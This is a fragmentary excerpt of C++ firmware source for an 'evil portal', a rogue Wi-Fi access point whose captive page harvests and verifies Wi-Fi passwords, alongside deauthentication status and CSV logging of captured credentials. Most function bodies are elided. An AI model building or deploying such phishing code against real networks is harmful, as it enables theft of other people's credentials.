...
void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
    ...
    if (url == "/") _portal->portalController(request);
        ...
        url == kvxConfig.evilPortalEndpoints.getCredsEndpoint &&
        kvxConfig.evilPortalEndpoints.allowGetCreds
    )
        request->send(200, "text/html", _portal->creds_GET());
    else if (
        url == kvxConfig.evilPortalEndpoints.setSsidEndpoint && kvxConfig.evilPortalEndpoints.allowSetSsid
    ) {
...
bool EvilPortal::setup() {
    if (apGateway == IPAddress((uint32_t)0)) {
        if (!apGateway.fromString(kvxConfig.evilPortalGatewayIp)) apGateway = IPAddress(172, 0, 0, 1);
    }
    ...
    if (apName.isEmpty()) {
        if (kvxConfig.evilWifiNames.empty()) {
            apName_from_keyboard();
        } else {
            options = {
                {"Custom Wifi", [this]() { apName_from_keyboard(); }}
            };
            for (const auto &_wifi : kvxConfig.evilWifiNames) {
...
void EvilPortal::setupRoutes() {
    ...
    if (kvxConfig.evilPortalEndpoints.allowGetCreds) {
        webServer.on(
            kvxConfig.evilPortalEndpoints.getCredsEndpoint.c_str(),
            [this](AsyncWebServerRequest *request) { request->send(200, "text/html", creds_GET()); }
        );
    }
    if (kvxConfig.evilPortalEndpoints.allowSetSsid) {
        webServer.on(
            kvxConfig.evilPortalEndpoints.setSsidEndpoint.c_str(), [this](AsyncWebServerRequest *request) {
                if (request->hasArg("ssid")) {
...
void EvilPortal::drawScreen() {
    ...
    String passMode = "";
    switch (kvxConfig.evilPortalPasswordMode) {
...
void EvilPortal::credsController(AsyncWebServerRequest *request) {
    ...
    if (_verifyPwd && passwordValue != "") {
        ...
        if (isCorrect) {
            ...
            printDeauthStatus();
            if (kvxConfig.getWifiPassword(apName) != "") {
                kvxConfig.addWifiCredential(apName, passwordValue);
            }
...
String EvilPortal::ssid_GET() {
    return getHtmlTemplate(
        ...
        kvxConfig.evilPortalEndpoints.setSsidEndpoint +
...
void EvilPortal::saveToCSV(const String &csvLine, bool isAPname) {
    ...
    if (!fs->exists(kvx::paths::WIFI_PORTAL_CREDS)) fs->mkdir(kvx::paths::WIFI_PORTAL_CREDS);

    File file;

    if (!isAPname) {
        file = fs->open((String(kvx::paths::WIFI_PORTAL_CREDS) + "/") + outputFile, FILE_APPEND);
    } else {
        file = fs->open((String(kvx::paths::WIFI_PORTAL_CREDS) + "/") + apName + "_creds.csv", FILE_APPEND);
    }
